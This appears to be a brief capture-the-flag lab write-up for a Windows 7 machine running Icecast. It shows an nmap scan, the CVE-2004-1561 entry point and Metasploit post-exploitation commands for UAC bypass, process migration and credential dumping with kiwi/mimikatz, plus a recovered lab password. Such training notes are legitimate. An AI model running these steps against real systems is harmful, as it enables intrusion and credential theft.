# ICE 

# IP - 10.10.110.47

# Nmap Scan

```
Host is up (0.17s latency).
Not shown: 988 closed ports
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  tcpwrapped
|_ssl-date: 2020-04-07T06:21:11+00:00; +1m26s from scanner time.
5357/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
8000/tcp  open  http         Icecast streaming media server
|_http-title: Site doesn't have a title (text/html).
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h16m26s, deviation: 2h30m00s, median: 1m25s
|_nbstat: NetBIOS name: DARK-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:65:e9:6e:54:2a (unknown)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Dark-PC
|   NetBIOS computer name: DARK-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-04-07T01:20:56-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-04-07T06:20:55
|_  start_date: 2020-04-07T06:15:25
```
# Vulnerabilities

```1.**Icecast** -Execute Code overflow - CVE 2004-1561```

# priv-esc using Metasploit

``` run post/mutli/recon/local_exploit_suggestor``` 

## We found - 
``` exploit/windows/local/bypassuac_eventvwr```

# Loading mimikartz - 
```load kiwi```

## Migrate into - spoolsv.exe
```migrate spoolsv.exe```


# Passwords found using Kiwi 
```creds_all```
```Password -DARK - Password01!```

# Exploit_db Script for Icecast 

## link - 
**https://exploit-db.com/exploits/568**

